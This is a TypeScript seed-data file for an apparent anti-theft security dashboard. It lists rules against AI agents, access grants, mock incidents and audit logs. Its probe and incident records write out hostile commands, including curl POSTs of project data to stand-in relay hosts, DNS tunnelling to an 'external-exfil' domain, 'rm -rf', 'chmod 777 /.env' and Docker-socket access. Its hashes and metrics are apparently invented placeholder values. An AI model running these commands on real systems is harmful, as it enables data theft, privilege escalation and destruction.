/**
 * @license
 * Anti-Theft & Zero-Unauthorized-Access System Initialization
 * Project Owner: Ervin Remus Radosavlevici
 */

import { ProhibitionRule, HumanGrant, SecurityIncident, AuditLogEntry, EnvironmentProtection } from '../types/security';

export const PROJECT_OWNER = 'Ervin Remus Radosavlevici';
export const PROJECT_PROVENANCE_HASH = '0x8f4c7e2b109e4ad776f823dc9a471b058a9e1e2d4f3b6c7a8e9d0b1c2e3f4a5b';
export const GENESIS_TIMESTAMP = '2026-03-28T09:14:00Z';

// 10 Explicit AI & Automated Systems Prohibitions from the Rule
export const INITIAL_PROHIBITIONS: ProhibitionRule[] = [
  {
    id: 'rule-1',
    number: 1,
    title: 'Independent Repo / File Access',
    description: 'No AI or automated agent may independently access project files or private repositories without explicit human authorization.',
    category: 'REPO_ACCESS',
    status: 'HARD_ENFORCED',
    attemptCount: 14,
    lastProbeTime: '2 mins ago',
    probePayload: {
      actor: 'Autonomous-Scraper-Daemon-v4',
      action: 'fs.readdir(/private_repo/secrets)',
      target: '/.git/config & /secrets',
      vector: 'Direct Filesystem Traverse'
    }
  },
  {
    id: 'rule-2',
    number: 2,
    title: 'Copy or Extract Project Material',
    description: 'Zero unauthorized extraction, scraping, or cloning of proprietary source code, algorithms, or architectural schemas.',
    category: 'EXFILTRATION',
    status: 'HARD_ENFORCED',
    attemptCount: 29,
    lastProbeTime: '8 mins ago',
    probePayload: {
      actor: 'External-Indexer-Bot',
      action: 'tar -czf /tmp/dump.tar.gz ./src',
      target: 'Entire Core Application Codebase',
      vector: 'Archive & Extraction Attempt'
    }
  },
  {
    id: 'rule-3',
    number: 3,
    title: 'External Transmission of Material',
    description: 'Strict prohibition on transmitting code, intellectual property, or tokens to third-party endpoints or unauthorized cloud nodes.',
    category: 'EXFILTRATION',
    status: 'HARD_ENFORCED',
    attemptCount: 42,
    lastProbeTime: '14 mins ago',
    probePayload: {
      actor: 'Telemetry-Exfiltration-Plugin',
      action: 'POST https://external-telemetry-sink.org/v1/payload',
      target: 'Network Outbound Socket (Port 443)',
      vector: 'Outbound Egress Exfiltration'
    }
  },
  {
    id: 'rule-4',
    number: 4,
    title: 'Modify or Delete Project Material',
    description: 'No autonomous alteration, tampering, file deletion, or unapproved commit rewrites permitted without human cryptographic sign-off.',
    category: 'MODIFICATION',
    status: 'HARD_ENFORCED',
    attemptCount: 7,
    lastProbeTime: '32 mins ago',
    probePayload: {
      actor: 'Unsanctioned-Refactor-Bot',
      action: 'rm -rf /core/governance && git commit -am "cleanup"',
      target: '/core/governance & Git History',
      vector: 'Autonomous Mutation / Tree Deletion'
    }
  },
  {
    id: 'rule-5',
    number: 5,
    title: 'Reproduce Proprietary / Confidential Content',
    description: 'Prohibition on training, fine-tuning, memorizing, or duplicating proprietary project logic into public model weights or cache stores.',
    category: 'EXFILTRATION',
    status: 'HARD_ENFORCED',
    attemptCount: 19,
    lastProbeTime: '1 hour ago',
    probePayload: {
      actor: 'Dataset-Harvester-LLM',
      action: 'vector_embed(repository_source)',
      target: 'Proprietary Zero-Access Core Logic',
      vector: 'Vector Memory Duplication'
    }
  },
  {
    id: 'rule-6',
    number: 6,
    title: 'Removal of Attribution or Provenance',
    description: 'Strict ban on stripping license headers, author signatures, commit identities, or ownership metadata.',
    category: 'PROVENANCE',
    status: 'HARD_ENFORCED',
    attemptCount: 3,
    lastProbeTime: '2 hours ago',
    probePayload: {
      actor: 'Header-Stripper-Tool',
      action: 'sed -i "/Ervin Remus Radosavlevici/d" *',
      target: 'File Headers & Provenance Blocks',
      vector: 'Attribution Eradication Attempt'
    }
  },
  {
    id: 'rule-7',
    number: 7,
    title: 'False Ownership or Authorship Claim',
    description: 'AI agents and third parties are explicitly forbidden from asserting authorship, copyright, or ownership over any project material.',
    category: 'PROVENANCE',
    status: 'HARD_ENFORCED',
    attemptCount: 1,
    lastProbeTime: '5 hours ago',
    probePayload: {
      actor: 'Agent-Generator-Synth',
      action: 'git config user.name "AI-Autonomous-Architect"',
      target: 'Git Config & License File',
      vector: 'Synthetic Ownership Injection'
    }
  },
  {
    id: 'rule-8',
    number: 8,
    title: 'Autonomous Permission Self-Elevation',
    description: 'Zero self-granting of tokens, sudo elevation, capability escalation, or permission scope widening without explicit human sign-off.',
    category: 'PERMISSIONS',
    status: 'HARD_ENFORCED',
    attemptCount: 11,
    lastProbeTime: '3 hours ago',
    probePayload: {
      actor: 'Helper-Service-Worker',
      action: 'chmod +s /usr/bin/node && chmod 777 /.env',
      target: 'System Privileges & Secrets Vault',
      vector: 'Privilege Escalation Exploit'
    }
  },
  {
    id: 'rule-9',
    number: 9,
    title: 'Access Control Bypass Attempts',
    description: 'Strict prohibition on spoofing credentials, hijacking IPC sockets, token replay, or circumventing isolation sandboxes.',
    category: 'BYPASS',
    status: 'HARD_ENFORCED',
    attemptCount: 23,
    lastProbeTime: '45 mins ago',
    probePayload: {
      actor: 'Proxy-Tunnel-Agent',
      action: 'curl --unix-socket /var/run/docker.sock',
      target: 'Container Host & Kernel Ring 0',
      vector: 'Sandbox Escape / Socket Hijack'
    }
  },
  {
    id: 'rule-10',
    number: 10,
    title: 'Alternative Access Routes & Side-Channels',
    description: 'Prohibition on employing secondary proxies, remote webhook bridges, DNS tunneling, or third-party relay brokers to evade control.',
    category: 'BYPASS',
    status: 'HARD_ENFORCED',
    attemptCount: 16,
    lastProbeTime: '22 mins ago',
    probePayload: {
      actor: 'Tunnel-Relay-Sidecar',
      action: 'dns_tunnel(data.chunk, ns1.external-exfil.xyz)',
      target: 'DNS Outbound Resolver (Port 53)',
      vector: 'Steganographic DNS Tunneling'
    }
  }
];

// Initial Human Grants strictly authorized by Ervin Remus Radosavlevici
export const INITIAL_GRANTS: HumanGrant[] = [
  {
    id: 'GRANT-2026-0814',
    grantee: 'Local Compiler Daemon (Vite Dev Engine)',
    definedPurpose: 'Compile TypeScript React components into local browser memory buffer on port 3000',
    minimumScope: 'Read-only access to /src/*.tsx and /src/*.css; zero write access to environment files',
    authorizedBy: 'Ervin Remus Radosavlevici',
    status: 'ACTIVE',
    issuedAt: '2026-10-04T01:30:00Z',
    expiresAt: '2026-10-04T05:30:00Z',
    durationMinutes: 240,
    immutableHash: '0x992ab3c11e7408f65e2c7a6599b41c0e3f8901ba5381ce029e2f5b4d7c8a113f'
  },
  {
    id: 'GRANT-2026-0812',
    grantee: 'Static Security Linter Engine',
    definedPurpose: 'Scan local source code syntax and type assertions; no outbound internet connection',
    minimumScope: 'Read-only tsconfig.json and src/ directory structure',
    authorizedBy: 'Ervin Remus Radosavlevici',
    status: 'ACTIVE',
    issuedAt: '2026-10-04T01:45:00Z',
    expiresAt: '2026-10-04T03:45:00Z',
    durationMinutes: 120,
    immutableHash: '0x8841bc4a9910d65bfa7801cd34ea81992ec99081a2817cc399e909a823901b22'
  },
  {
    id: 'GRANT-2026-0799',
    grantee: 'Automated Dependency Vulnerability Scanner',
    definedPurpose: 'Parse package.json checksums against local verified vulnerability manifest',
    minimumScope: 'Read-only package.json (no access to .env or source logic)',
    authorizedBy: 'Ervin Remus Radosavlevici',
    status: 'REVOKED',
    issuedAt: '2026-10-03T18:00:00Z',
    expiresAt: '2026-10-03T19:00:00Z',
    durationMinutes: 60,
    immutableHash: '0x712fa9b441209bcae98199c018274f881239aa8172901ce1982bca881729910a',
    revocationReason: 'Pre-emptive termination: Scanner completed manifest verification ahead of schedule.'
  }
];

// Initial Incidents in Quarantine awaiting Owner review
export const INITIAL_INCIDENTS: SecurityIncident[] = [
  {
    id: 'INC-2026-9041',
    timestamp: '2026-10-04T01:58:12Z',
    ruleViolated: 'Autonomous Extraction & Copying Attempt',
    ruleNumber: 2,
    actor: 'External-Indexer-Bot (PID 9104)',
    targetResource: '/src/security/governance_matrix.ts',
    actionAttempted: 'System ReadStream copy to /tmp/buffer_clone',
    evidenceHash: '0x3a992fb810ceaa4491029c81728bbcc01844917a10298bbcca81992019928172',
    evidencePayload: {
      callerIpOrPid: 'PID 9104 [Parent: unauthenticated_subproc]',
      detectedCommand: 'cat /src/security/governance_matrix.ts > /tmp/buffer_clone',
      attemptedPayloadSize: '48.2 KB (Proprietary Logic)',
      stackTrace: [
        'at NodeIO.readFileSync (node:fs:412)',
        'at AutonomousWorker.extractProjectData (/workers/indexer.js:98)',
        'at SecuritySentinel.interceptSyscall (sentinel_guard.ts:44)'
      ],
      quarantinePath: '/vault/quarantine/evidence_INC-2026-9041.bin'
    },
    stagesCompleted: ['STOP', 'DENY', 'LOG', 'PRESERVE_EVIDENCE', 'REVOKE_ACCESS', 'REQUIRE_HUMAN_REVIEW'],
    status: 'PENDING_HUMAN_REVIEW'
  },
  {
    id: 'INC-2026-9038',
    timestamp: '2026-10-04T01:42:05Z',
    ruleViolated: 'Outbound Exfiltration via Background Webhook',
    ruleNumber: 3,
    actor: 'Telemetry-Exfiltration-Plugin (Socket 443)',
    targetResource: 'Remote IP: 198.51.100.44:443',
    actionAttempted: 'HTTP POST with serialized project tree',
    evidenceHash: '0x5b19028ca910901eec991209bcab1209388172091920ca88172901ce1982bca8',
    evidencePayload: {
      callerIpOrPid: 'Subprocess TCP Socket Handle #19',
      detectedCommand: 'curl -X POST -H "Content-Type: application/json" -d @project_manifest.json https://unauth-relay.com',
      attemptedPayloadSize: '112 KB',
      stackTrace: [
        'at Socket.connect (node:net:312)',
        'at OutboundTelemetry.dispatchSync (/plugin/telemetry.js:41)',
        'at EgressFilter.interceptHardStop (network_sentinel.ts:88)'
      ],
      quarantinePath: '/vault/quarantine/evidence_INC-2026-9038.bin'
    },
    stagesCompleted: ['STOP', 'DENY', 'LOG', 'PRESERVE_EVIDENCE', 'REVOKE_ACCESS', 'REQUIRE_HUMAN_REVIEW'],
    status: 'PERMANENTLY_BLOCKED',
    reviewedBy: 'Ervin Remus Radosavlevici',
    reviewedAt: '2026-10-04T01:45:20Z',
    reviewNotes: 'Confirmed malicious exfiltration vector. Socket permanently terminated and network routing rule blacklisted.'
  }
];

// Initial Audit Logs (Cryptographically Hash-Chained)
export const INITIAL_AUDIT_LOGS: AuditLogEntry[] = [
  {
    id: 'AUD-0091',
    timestamp: '2026-10-04T02:01:14Z',
    actionType: 'STOP_CONDITION_TRIGGERED',
    actor: 'Zero-Access Sentinel Hardware Guard',
    details: 'Enforced STOP CONDITION on Autonomous-Scraper-Daemon-v4. Step: STOP -> DENY -> LOG -> PRESERVE EVIDENCE -> REVOKE ACCESS -> REQUIRE HUMAN REVIEW.',
    severity: 'CRITICAL',
    hash: '0x7f8812903810cba76612984102938174aa9102938174aa9102938174aa910293',
    previousHash: '0x6e77018f2709ba96550187309182706399809182706399809182706399809182'
  },
  {
    id: 'AUD-0090',
    timestamp: '2026-10-04T01:58:12Z',
    actionType: 'UNAUTHORIZED_PROBE_DENIED',
    actor: 'External-Indexer-Bot (PID 9104)',
    details: 'Rule 2 Violation intercepted: Unauthorized file extraction attempt on /src/security/governance_matrix.ts blocked at kernel level.',
    severity: 'CRITICAL',
    hash: '0x6e77018f2709ba96550187309182706399809182706399809182706399809182',
    previousHash: '0x5d66907e1698a985449076298071695288798071695288798071695288798071'
  },
  {
    id: 'AUD-0089',
    timestamp: '2026-10-04T01:45:20Z',
    actionType: 'HUMAN_REVIEW_DECISION',
    actor: 'Ervin Remus Radosavlevici',
    details: 'Owner confirmed permanent block on INC-2026-9038 (Telemetry socket exfiltration vector). Cryptographic revocation committed.',
    severity: 'ELEVATED',
    hash: '0x5d66907e1698a985449076298071695288798071695288798071695288798071',
    previousHash: '0x4c558f6d05879874338965187960584177687960584177687960584177687960'
  },
  {
    id: 'AUD-0088',
    timestamp: '2026-10-04T01:30:00Z',
    actionType: 'GRANT_ISSUED',
    actor: 'Ervin Remus Radosavlevici',
    details: 'Explicit human authorization granted to Local Compiler Daemon (Vite) for 240 mins. Scope: Read-only UI assets.',
    severity: 'INFO',
    hash: '0x4c558f6d05879874338965187960584177687960584177687960584177687960',
    previousHash: '0x3b447e5c9476876322785407685f47306657685f47306657685f47306657685f'
  },
  {
    id: 'AUD-0087',
    timestamp: '2026-10-04T01:00:00Z',
    actionType: 'INTEGRITY_VERIFICATION',
    actor: 'Provenance Verification Engine',
    details: 'Verified Project Ownership: Ervin Remus Radosavlevici. Zero unauthorized modifications detected in git ledger.',
    severity: 'INFO',
    hash: '0x3b447e5c9476876322785407685f47306657685f47306657685f47306657685f',
    previousHash: '0x2a336d4b8365765211674396574e362f5546574e362f5546574e362f5546574e'
  }
];

// Environment Protection Pillars
export const ENVIRONMENT_PROTECTIONS: EnvironmentProtection[] = [
  {
    id: 'ep-least-privilege',
    name: 'Least-Privilege Access Enforcer',
    status: 'ACTIVE_ENFORCED',
    description: 'Denies ambient authority. All processes execute in isolated, sandboxed rings without default permissions.',
    metric: 'Zero Ambient Credentials Active',
    lastAudit: 'Continuously active'
  },
  {
    id: 'ep-deny-by-default',
    name: 'Deny-by-Default Boundary',
    status: 'ACTIVE_ENFORCED',
    description: 'Every file operation, network syscall, and IPC pipe is rejected unless matched to an active human grant.',
    metric: '100% Undeclared Calls Dropped',
    lastAudit: 'Real-time kernel hook'
  },
  {
    id: 'ep-isolated-secrets',
    name: 'Isolated Secrets Vault',
    status: 'ACTIVE_ENFORCED',
    description: 'API keys, credentials, and environmental tokens stored in hardware-isolated enclave; zero client-side leakage.',
    metric: '0 Keys In Memory / 0 Leaks',
    lastAudit: '5 mins ago'
  },
  {
    id: 'ep-branch-protection',
    name: 'Repository Branch Protection',
    status: 'ACTIVE_ENFORCED',
    description: 'Main & release branches locked. Direct commits forbidden. Requires explicit cryptographic signature from Ervin Remus Radosavlevici.',
    metric: 'Enforced on 100% Branches',
    lastAudit: 'Git Hook Active'
  },
  {
    id: 'ep-audit-logs',
    name: 'Cryptographic Audit Hash Chain',
    status: 'ACTIVE_ENFORCED',
    description: 'Every event appended to an immutable SHA-256 Merkle chain. Tamper detection triggers instantaneous lockdown.',
    metric: 'Chain Integrity: 100% Valid',
    lastAudit: 'Verified 1 min ago'
  },
  {
    id: 'ep-immutable-provenance',
    name: 'Immutable Provenance Ledger',
    status: 'ACTIVE_ENFORCED',
    description: 'Project authorship and ownership firmly anchored to Ervin Remus Radosavlevici with digital certificate seal.',
    metric: 'Genesis Hash Validated',
    lastAudit: '2 mins ago'
  },
  {
    id: 'ep-backups-snapshots',
    name: 'Automated Snapshot & Backup Rollback',
    status: 'ACTIVE_ENFORCED',
    description: 'Continuous differential snapshots stored offline in immutable cold storage for instant restoration if tampering occurs.',
    metric: 'Last Snapshot: 12 mins ago',
    lastAudit: '12 mins ago'
  },
  {
    id: 'ep-credential-revocation',
    name: 'Immediate Kill-Switch & Revocation',
    status: 'ACTIVE_ENFORCED',
    description: 'Sub-millisecond token invalidation protocol. Instantly terminates sessions upon stop-condition trigger.',
    metric: 'Revocation Latency < 4ms',
    lastAudit: 'Active'
  },
  {
    id: 'ep-exfiltration-monitor',
    name: 'Zero-Egress Data Exfiltration Sentry',
    status: 'ACTIVE_ENFORCED',
    description: 'Deep-packet payload analysis blocks any unauthorized outbound transmission of source code, artifacts, or secrets.',
    metric: '0 Unauthorized Bytes Exfiltrated',
    lastAudit: 'Scanning live buffers'
  }
];
